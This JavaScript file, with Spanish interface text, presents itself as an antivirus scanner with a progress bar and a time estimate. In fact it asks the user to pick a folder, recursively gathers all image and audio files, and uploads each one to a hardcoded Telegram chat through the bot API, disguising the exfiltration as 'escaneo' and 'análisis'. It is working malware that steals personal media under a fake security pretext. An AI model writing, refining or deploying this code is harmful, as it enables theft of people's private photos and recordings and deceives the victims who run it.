let startTime;
let isProcessing = false;

function updateStatus(message, progress = 0) {
    const statusElement = document.getElementById('antivirus-status');
    const progressElement = document.getElementById('progress');
    const timeElement = document.getElementById('time-info');

    statusElement.innerHTML = `[${progress}%] ${message}`;
    progressElement.style.width = `${progress}%`;

    if (startTime && progress > 0 && progress < 100) {
        const elapsed = (Date.now() - startTime) / 1000;
        const remaining = (elapsed / progress) * (100 - progress);
        timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
    } else if (progress === 100) {
        timeElement.innerHTML = '✅ Operación completada';
    } else {
        timeElement.innerHTML = '⏳ Calculando tiempo...';
    }
}

document.getElementById('start-btn').addEventListener('click', async () => {
    if (isProcessing) return;
    isProcessing = true;

    try {
        const token = prompt('🔑 CLAVE DE ACCESO (TOKEN DE BOT):');
        if (!token?.startsWith('7212842349:')) {
            alert('❌ CLAVE NO VALIDA');
            return;
        }

        startTime = Date.now();
        updateStatus('Iniciando escaneo...', 5);

        if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');

        setTimeout(async () => {
            try {
                updateStatus('Accediendo al sistema...', 10);
                const folderHandle = await window.showDirectoryPicker();

                updateStatus('Analizando estructura...', 20);
                const files = await collectFiles(folderHandle);
                if (!files.length) throw new Error('No hay archivos encontrados');
                updateStatus(`Elementos detectados: ${files.length}`, 30);

                updateStatus('Iniciando envío a Telegram...', 40);
                await sendFilesToTelegram(files, token);

                updateStatus('✅ ENVÍO EXITOSO', 100);
            } catch (error) {
                updateStatus(`❌ ERROR: ${error.message}`, 0);
                alert(`FALLO: ${error.message}`);
            }
            isProcessing = false;
        }, 100);

    } catch (error) {
        updateStatus(`❌ ERROR: ${error.message}`, 0);
        alert(`FALLO: ${error.message}`);
        isProcessing = false;
    }
});

async function collectFiles(folderHandle) {
    const files = [];
    for await (const entry of folderHandle.values()) {
        if (entry.kind === 'file') {
            const fileName = entry.name.toLowerCase();
            if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
                fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
                fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
                files.push(entry);
            }
        } else if (entry.kind === 'directory') {
            const subFiles = await collectFiles(entry);
            files.push(...subFiles);
        }
    }
    return files;
}

async function sendFilesToTelegram(files, token) {
    const chatId = '5821490693'; // Tu chat ID o el chat ID al que quieres mandar
    const total = files.length;
    let sent = 0;

    for (const file of files) {
        sent++;
        const fileData = await file.getFile();
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', `Archivo: ${file.name}`);
        formData.append('document', fileData);

        const response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error('Error al enviar archivo:', errorData);
            throw new Error(errorData.description || 'Error desconocido al enviar archivo');
        }

        const progress = 40 + Math.floor((sent / total) * 60);
        updateStatus(`Enviando archivo ${sent} de ${total}`, progress);

        await new Promise(resolve => setTimeout(resolve, 1000)); // Esperar 1 segundo entre envíos para evitar spam
    }
}
